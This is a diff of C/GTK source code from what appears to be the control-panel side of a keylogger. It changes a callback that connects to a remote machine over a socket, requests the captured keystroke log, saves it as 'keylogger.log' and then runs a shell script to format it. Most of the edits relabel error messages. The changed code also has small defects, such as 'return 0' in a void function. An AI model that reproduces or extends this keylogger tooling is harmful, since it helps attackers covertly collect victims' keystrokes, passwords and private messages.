@@ -205,12 +205,17 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
     long totalRcv = 0;
 
     FILE *log_file = NULL;
+    FILE *final_log_file = NULL;
     size_t flag_log = 6;
 
     GtkTextBuffer *text_buffer = NULL;
     gchar *text = NULL;
     GtkTextIter start;
     GtkTextIter end;
+
+    char caractere = 0;
+    size_t i = 0;
+
 
     log_file = fopen("keylogger.log", "w+");
     if(log_file == NULL)
@@ -231,25 +236,25 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if(sock == INVALID_SOCKET)
     {
-        error("socket()", "ubuntu_record()");
+        error("socket()", "cb_download_log_file()");
         return;
     }
 
     if(connect(sock, (SOCKADDR*)&sin, sizeof(sin)) == SOCKET_ERROR)
     {
-        error("connect()", "open_log_file()");
+        error("connect()", "cb_download_log_file()");
         return;
     }
 
     if(send(sock, (char*)&flag_log, sizeof(flag_log), 0) == SOCKET_ERROR)
     {
-        error("send() flag_log", "open_log_file()");
+        error("send() flag_log", "cb_download_log_file()");
         return;
     }
 
     if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
     {
-        error("recv() data_len", "open_log_file()");
+        error("recv() data_len", "cb_download_log_file()");
         return;
     }
 
@@ -258,7 +263,7 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
         tailleBlockRecut = recv(sock, buffer, sizeof(data_len), 0);
         if(tailleBlockRecut < 0)
         {
-            error("recv() buffer", "open_log_file()");
+            error("recv() buffer", "cb_download_log_file()");
             return;
         }
 
@@ -289,6 +294,12 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
     g_free(text);
 
     fclose(log_file);
+
+    if(system("bash indent_keylog_file.sh") == -1)
+    {
+        error("system() indent_keylog_file.sh", "cb_download_log_file()");
+        return 0;
+    }
 
     /* Parametres inutilises */
     (void)button;
